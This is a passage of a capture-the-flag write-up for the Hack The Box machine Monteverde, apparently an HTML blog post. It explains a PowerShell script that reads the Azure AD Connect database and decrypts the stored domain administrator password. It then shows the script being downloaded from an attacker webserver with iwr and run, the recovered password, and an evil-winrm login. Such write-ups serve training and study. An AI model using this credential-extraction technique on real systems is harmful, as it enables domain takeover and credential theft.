+<span style="color: #F8F8F2">$reader.Close()</span>
+</code></pre></div>
+
+<p>Detailed explanation:</p>
+<p>This is pretty similar to the previous section in that if fetches some stuff :) </p>
+<p>The block starts out with the author creating an SQL command <code>SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'</code>.</p>
+<p>This SQL command extracts:</p>
+<ol>
+<li>private_configuration_xml (which contains basic user/domain info, also specifies if password is encrypted or not) </li>
+</ol>
+<p>Sample output:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #FF4689">&lt;adma-configuration&gt;</span><span style="color: #F8F8F2">                                                                                                  </span>
+<span style="color: #F8F8F2"> </span><span style="color: #FF4689">&lt;forest-name&gt;</span>MEGABANK.LOCAL<span style="color: #FF4689">&lt;/forest-name&gt;</span><span style="color: #F8F8F2">                             </span>
+<span style="color: #F8F8F2"> </span><span style="color: #FF4689">&lt;forest-port&gt;</span>0<span style="color: #FF4689">&lt;/forest-port&gt;</span><span style="color: #F8F8F2">       </span>
+<span style="color: #F8F8F2"> </span><span style="color: #FF4689">&lt;forest-guid&gt;</span>{00000000-0000-0000-0000-000000000000}<span style="color: #FF4689">&lt;/forest-guid&gt;</span><span style="color: #F8F8F2">                                                    </span>
+<span style="color: #F8F8F2"> </span><span style="color: #FF4689">&lt;forest-login-user&gt;</span>administrator<span style="color: #FF4689">&lt;/forest-login-user&gt;</span><span style="color: #F8F8F2">                                                                                             </span>
+<span style="color: #F8F8F2"> </span><span style="color: #FF4689">&lt;forest-login-domain&gt;</span>MEGABANK.LOCAL<span style="color: #FF4689">&lt;/forest-login-domain&gt;</span>
+
+[snip.....]
+</code></pre></div>
+
+<ol start="2">
+<li>encrypted_configuration which contains our encrypted password (base64 encrypted) </li>
+</ol>
+<p>Sample output:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8
+Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ<span style="color: #FF4689">=</span>
+</code></pre></div>
+
+<p>It then proceeds to store them in their respected variables.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077"># Import the dll into powershell</span>
+<span style="color: #F8F8F2">add-type</span> <span style="color: #F8F8F2">-path</span> <span style="color: #E6DB74">&quot;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&quot;</span>
+
+<span style="color: #959077"># Setup KeyMaanger object</span>
+<span style="color: #F8F8F2">$km</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">New-Object</span> <span style="color: #F8F8F2">-TypeName</span> <span style="color: #F8F8F2">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span>
+
+<span style="color: #959077"># Pass it the data we gatherd from the first SQL command, and then decrypt the encrypted base64</span>
+<span style="color: #F8F8F2">$km.LoadKeySet($entropy,</span> <span style="color: #F8F8F2">$instance_id,</span> <span style="color: #F8F8F2">$key_id)</span>
+<span style="color: #F8F8F2">$key</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$null</span>
+<span style="color: #F8F8F2">$km.GetActiveCredentialKey(</span><span style="color: #66D9EF">[ref]</span><span style="color: #F8F8F2">$key)</span>
+<span style="color: #F8F8F2">$key2</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$null</span>
+<span style="color: #F8F8F2">$km.GetKey(1,</span> <span style="color: #66D9EF">[ref]</span><span style="color: #F8F8F2">$key2)</span>
+<span style="color: #F8F8F2">$decrypted</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">$null</span>
+<span style="color: #F8F8F2">$key2.DecryptBase64ToString($crypted,</span> <span style="color: #66D9EF">[ref]</span><span style="color: #F8F8F2">$decrypted)</span>
+</code></pre></div>
+
+<p>Detailed explanation:</p>
+<p>This block of the script uses add-type to a .NET dll into a powershell session. It then uses the keymanager utility and passes in the entropy, instance_id, and finally the key_id. We then fetch the appropriate symmetric key that we can use to decrypt the encrypted base64. As you might find out we are using Key #1.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #F8F8F2">$domain</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">select-xml</span> <span style="color: #F8F8F2">-Content</span> <span style="color: #F8F8F2">$config</span> <span style="color: #F8F8F2">-XPath</span> <span style="color: #E6DB74">&quot;//parameter[@name=&#39;forest-login-domain&#39;]&quot;</span> <span style="color: #F8F8F2">|</span> <span style="color: #F8F8F2">select @{Name</span> <span style="color: #F8F8F2">=</span> <span style="color: #E6DB74">&#39;Domain&#39;</span><span style="color: #F8F8F2">;</span> <span style="color: #F8F8F2">Expression</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">{$_.node.InnerXML}}</span>
+<span style="color: #F8F8F2">$username</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">select-xml</span> <span style="color: #F8F8F2">-Content</span> <span style="color: #F8F8F2">$config</span> <span style="color: #F8F8F2">-XPath</span> <span style="color: #E6DB74">&quot;//parameter[@name=&#39;forest-login-user&#39;]&quot;</span> <span style="color: #F8F8F2">|</span> <span style="color: #F8F8F2">select @{Name</span> <span style="color: #F8F8F2">=</span> <span style="color: #E6DB74">&#39;Username&#39;</span><span style="color: #F8F8F2">;</span> <span style="color: #F8F8F2">Expression</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">{$_.node.InnerXML}}</span>
+<span style="color: #F8F8F2">$password</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">select-xml</span> <span style="color: #F8F8F2">-Content</span> <span style="color: #F8F8F2">$decrypted</span> <span style="color: #F8F8F2">-XPath</span> <span style="color: #E6DB74">&quot;//attribute&quot;</span> <span style="color: #F8F8F2">|</span> <span style="color: #F8F8F2">select @{Name</span> <span style="color: #F8F8F2">=</span> <span style="color: #E6DB74">&#39;Password&#39;</span><span style="color: #F8F8F2">;</span> <span style="color: #F8F8F2">Expression</span> <span style="color: #F8F8F2">=</span> <span style="color: #F8F8F2">{$_.node.InnerXML}}</span>
+
+<span style="color: #E6DB74">&quot;[+] Domain:  &quot;</span> <span style="color: #F8F8F2">+</span> <span style="color: #F8F8F2">$domain.Domain</span>
+<span style="color: #E6DB74">&quot;[+] Username: &quot;</span> <span style="color: #F8F8F2">+</span> <span style="color: #F8F8F2">$username.Username</span>
+<span style="color: #E6DB74">&quot;[+]Password: &quot;</span> <span style="color: #F8F8F2">+</span> <span style="color: #F8F8F2">$password.Password</span>
+<span style="color: #F8F8F2">}}</span>
+</code></pre></div>
+
+<p>This is just parsing the decrypted xml and then outputting it in such a way that it is readable.</p>
+<p>I then asked ChatGPT after pasting in the above file to modify the script so that it outputs all the variables as the program manges to find them. This is mostly so we can get a decent understanding of what is going on in the script. To see and run the modified version of the program, you can go visit this url:<br />
+<br><br />
+https://gist.github.com/ma1ware07/a22a5c91122b158d3bae392acd52e17b</p>
+<p>Anyway, we now have a very decent understanding of the script and we can proceed to get Administrator access now.</p>
+<h4 id="administrator-at-last">Administrator at last!</h4>
+<p>I spin up a webserver on port 80, and download the file using Invoke-WebRequest (iwr).</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #F8F8F2">*Evil-WinRM*</span> <span style="color: #F8F8F2">PS C:\Users\mhope&gt;</span> <span style="color: #F8F8F2">iwr -uri</span> <span style="color: #F8F8F2">http://10.10.16.26/Azure-ADConnect.ps1</span> <span style="color: #F8F8F2">-Outfile</span> <span style="color: #F8F8F2">Azure-ADConnect.ps1</span>
+<span style="color: #F8F8F2">*Evil-WinRM*</span> <span style="color: #F8F8F2">PS C:\Users\mhope&gt;</span> <span style="color: #F8F8F2">.</span> <span style="color: #F8F8F2">.\Azure-ADConnect.ps1</span>
+<span style="color: #F8F8F2">*Evil-WinRM*</span> <span style="color: #F8F8F2">PS C:\Users\mhope&gt;</span> <span style="color: #F8F8F2">Azure-ADConnect</span> <span style="color: #F8F8F2">-server</span> <span style="color: #F8F8F2">localhost</span> <span style="color: #F8F8F2">-db</span> <span style="color: #F8F8F2">ADSync</span>
+<span style="color: #F8F8F2">[+]</span> <span style="color: #F8F8F2">Domain:</span>  <span style="color: #F8F8F2">MEGABANK.LOCAL</span>
+<span style="color: #F8F8F2">[+]</span> <span style="color: #F8F8F2">Username:</span> <span style="color: #F8F8F2">administrator</span>
+<span style="color: #F8F8F2">[+]Password:</span> <span style="color: #F8F8F2">d0m@in4dminyeah!</span>
+</code></pre></div>
+
+<p>We can login into the box using evil-winrm and then fetch the root flag.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>~/htb/boxes/OSCP-PREP/Monteverde<span style="color: #F8F8F2"> </span>❯<span style="color: #F8F8F2"> </span>evil-winrm<span style="color: #F8F8F2"> </span>-i<span style="color: #F8F8F2"> </span>MEGABANK.LOCAL<span style="color: #F8F8F2"> </span>-u<span style="color: #F8F8F2"> </span>Administrator<span style="color: #F8F8F2"> </span>-p<span style="color: #F8F8F2"> </span><span style="color: #E6DB74">&#39;d0m@in4dminyeah!&#39;</span>
+
+Evil-WinRM<span style="color: #F8F8F2"> </span>shell<span style="color: #F8F8F2"> </span>v3.7
+
+
+Info:<span style="color: #F8F8F2"> </span>Establishing<span style="color: #F8F8F2"> </span>connection<span style="color: #F8F8F2"> </span>to<span style="color: #F8F8F2"> </span>remote<span style="color: #F8F8F2"> </span>endpoint
+*Evil-WinRM*<span style="color: #F8F8F2"> </span>PS<span style="color: #F8F8F2"> </span>C:<span style="color: #AE81FF">\U</span>sers<span style="color: #AE81FF">\A</span>dministrator<span style="color: #AE81FF">\D</span>ocuments&gt;<span style="color: #F8F8F2"> </span>
+</code></pre></div>
+
+<p>root.txt: 6c5262d96d322d0928c3deea48fb993f</p>
+<p>That's the box, I hope you enjoyed it!</p>
+  </article>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="https://github.com/0xma1ware" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://x.com/0xma1ware" target="_blank" rel="noopener">X / Twitter</a>
+      <a href="mailto:ma1ware@protonmail.com">Email</a>
+    </div>
+    <p>&copy; 2025 0xma1ware. All rights reserved.</p>
+  </footer>
+</body>
+</html>
